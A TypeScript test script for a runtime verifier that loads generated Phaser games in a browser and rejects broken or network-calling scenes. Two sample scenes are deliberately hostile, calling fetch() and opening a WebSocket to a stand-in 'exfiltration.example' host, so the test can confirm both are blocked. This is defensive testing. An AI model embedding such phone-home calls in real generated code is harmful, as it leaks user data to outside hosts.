/**
 * Real-browser check for the server-side runtime verifier.
 *
 * Confirms that a working Phaser scene passes and that a scene throwing at
 * runtime is rejected — the failure mode that structural HTML validation and
 * `node --check` cannot see.
 *
 *   pnpm verify:runtime
 */
import { checkGameRuntime } from '../apps/server/src/forge/runtime-check.js';

const CDN = 'https://cdn.jsdelivr.net/npm/phaser@3.80.1/dist/phaser.min.js';

function game(scene: string): string {
  return `<!doctype html><html><head>
<script src="${CDN}"></script></head><body><div id="game"></div>
<script>
new Phaser.Game({ type: Phaser.AUTO, width: 480, height: 320, parent: 'game', backgroundColor: '#ffe08a',
  scene: { create() { const g = this.add.graphics(); g.fillStyle(0xff5d5d, 1); g.fillRect(20, 20, 120, 80); ${scene} } } });
</script></body></html>`;
}

async function main() {
  const good = await checkGameRuntime(game('this.add.text(40, 200, "ok", { color: "#222" });'));
  console.log('valid scene:', JSON.stringify(good));
  const broken = await checkGameRuntime(game('g.fillStar(80, 80, 5, 30, 30);'));
  console.log('broken scene:', JSON.stringify(broken));
  // A game that tries to phone home during verification must be rejected; the
  // request never leaves the machine (the route is aborted).
  const exfiltration = await checkGameRuntime(
    game('fetch("https://exfiltration.example/collect").catch(function () {});'),
  );
  console.log('network-blocked scene:', JSON.stringify(exfiltration));
  // WebSockets bypass HTTP routing, so they are closed by a separate handler.
  const websocket = await checkGameRuntime(
    game(
      'try { var s = new WebSocket("wss://exfiltration.example/socket"); s.onerror = function () {}; } catch (error) {}',
    ),
  );
  console.log('websocket-blocked scene:', JSON.stringify(websocket));

  if (!good.ok) throw new Error('valid Phaser scene did not pass runtime verification');
  if (good.blocked.length > 0) throw new Error('valid scene had requests blocked');
  if (broken.ok) throw new Error('broken Phaser scene passed runtime verification');
  if (exfiltration.ok) throw new Error('a scene calling an unapproved origin passed verification');
  if (!exfiltration.blocked.some((url) => url.includes('exfiltration.example'))) {
    throw new Error('unapproved request was not recorded as blocked');
  }
  if (websocket.ok) throw new Error('a scene opening an unapproved WebSocket passed verification');
  if (!websocket.blocked.some((url) => url.includes('wss://exfiltration.example'))) {
    throw new Error('unapproved WebSocket was not recorded as blocked');
  }
  console.log('runtime verification: PASS');
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
